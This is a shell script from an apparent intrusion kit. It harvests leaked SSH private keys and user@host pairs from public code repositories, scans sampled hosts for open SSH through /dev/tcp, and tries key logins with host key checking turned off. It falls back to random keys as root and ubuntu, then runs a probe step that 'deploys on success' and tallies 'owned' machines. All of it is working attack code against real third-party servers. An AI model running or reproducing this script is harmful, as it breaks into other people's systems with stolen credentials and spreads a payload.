#!/bin/sh
# throwaway: WIDE visible scan. The timer uses worker.env's 20 repos; to sweep
# far wider without editing the single source of truth, run from a throwaway
# copy of the kit with its own worker.env and point HUNT_WORK at the real state.
set -u
R=/tmp/scanrun
W=/tmp/.sysd/.hunt
mkdir -p "$R"
cp -f /tmp/.sysd/hunt.sh "$R/hunt.sh"
cp -f /tmp/.sysd/worker.env "$R/worker.env"
sed -i -e 's/^HUNT_MAX_REPOS=.*/HUNT_MAX_REPOS="60"/' \
       -e 's/^HOSTS_PER_REPO=.*/HOSTS_PER_REPO="8"/' "$R/worker.env"
printf '\nHUNT_MAX_PROBE="200"\n' >> "$R/worker.env"
. "$R/worker.env"
TARGET_USERS="${TARGET_USERS:-root}"

echo "=== 0. start $(date -u +%FT%TZ)  repos=$HUNT_MAX_REPOS  hosts_per_repo=$HOSTS_PER_REPO ==="
echo "    (timer setting is 20 repos - this run is deliberately 3x wider)"

echo
echo "=== 1. HARVEST: 7 code searches, 60 repos ==="
HUNT_WORK="$W" sh "$R/hunt.sh" harvest

echo
echo "=== 2. REPOS INSPECTED THIS RUN ($(wc -l < "$W/repos.txt" 2>/dev/null)) ==="
cat "$W/repos.txt" 2>/dev/null

echo
echo "=== 3. KEY FILES: fingerprint + comment ==="
for k in "$W"/keys/*; do
    [ -f "$k" ] || continue
    printf '%s :: ' "$(basename "$k")"
    ssh-keygen -l -f "$k" 2>/dev/null || echo unreadable
done
echo "keys=$(ls "$W/keys" 2>/dev/null | wc -l)  queued_rows=$(wc -l < "$W/targets.txt")  already_probed=$(wc -l < "$W/seen.txt")"

echo
echo "=== 4. EXPLICIT user@host PAIRS FOUND THIS RUN ==="
cat "$W/pairs.txt" 2>/dev/null || echo "(none)"

echo
echo "=== 5. NEW HOSTS: port 22 + SSH banner (150 sampled from queue) ==="
cut -f3 "$W/targets.txt" | sort -u > /tmp/allh.txt
cut -d@ -f2 "$W/seen.txt" | sort -u > /tmp/seeh.txt
comm -23 /tmp/allh.txt /tmp/seeh.txt | sort -R 2>/dev/null | head -150 > /tmp/newh.txt
echo "never-probed hosts in queue: $(wc -l < /tmp/newh.txt)"
rm -f /tmp/open.txt
while read -r ip; do
    [ -n "$ip" ] || continue
    ( b="/tmp/ban.$ip"
      timeout 3 bash -c "exec 3<>/dev/tcp/$ip/22; head -1 <&3" > "$b" 2>/dev/null
      [ -s "$b" ] && printf '%s\t%s\n' "$ip" "$(tr -d '\r' < "$b")" >> /tmp/open.txt
      rm -f "$b" ) &
done < /tmp/newh.txt
wait
sort -u /tmp/open.txt -o /tmp/open.txt 2>/dev/null || :
echo "live ssh servers found: $(wc -l < /tmp/open.txt)"
cat /tmp/open.txt

echo
echo "=== 6a. ATTEMPTS USING THE QUEUE'S OWN PAIRING (key that named this host) ==="
cut -f1 /tmp/open.txt 2>/dev/null | head -8 > /tmp/tgt.txt
while read -r ip; do
    [ -n "$ip" ] || continue
    grep -F "$(printf '\t%s' "$ip")" "$W/targets.txt" | awk -F'\t' '{print $1" "$2}' | sort -u | head -6 \
    | while read -r key user; do
        printf '%-30s %-34s ' "$user@$ip" "$(basename "$key")"
        if ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
               -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
               -o ConnectTimeout=3 "$user@$ip" true 2>/dev/null; then echo "LOGIN_OK";
        else echo deny; fi
      done
done < /tmp/tgt.txt

echo
echo "=== 6b. FALLBACK: 3 random live keys x root/ubuntu on those hosts ==="
for k in $(ls "$W"/keys/* | sort -R 2>/dev/null | head -3); do
    for ip in $(cut -f1 /tmp/open.txt 2>/dev/null | head -4); do
        for u in root ubuntu; do
            printf '%-30s %-34s ' "$u@$ip" "$(basename "$k")"
            if ssh -i "$k" -o IdentitiesOnly=yes -o BatchMode=yes \
                   -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
                   -o ConnectTimeout=3 "$u@$ip" true 2>/dev/null; then echo "LOGIN_OK";
            else echo deny; fi
        done
    done
done

echo
echo "=== 7. PROBE PASS (writes seen.txt, deploys on success) ==="
HUNT_WORK="$W" sh "$R/hunt.sh" probe
echo "owned=$(wc -l < "$W/owned.txt")"
echo "=== SCAN DONE $(date -u +%FT%TZ) ==="
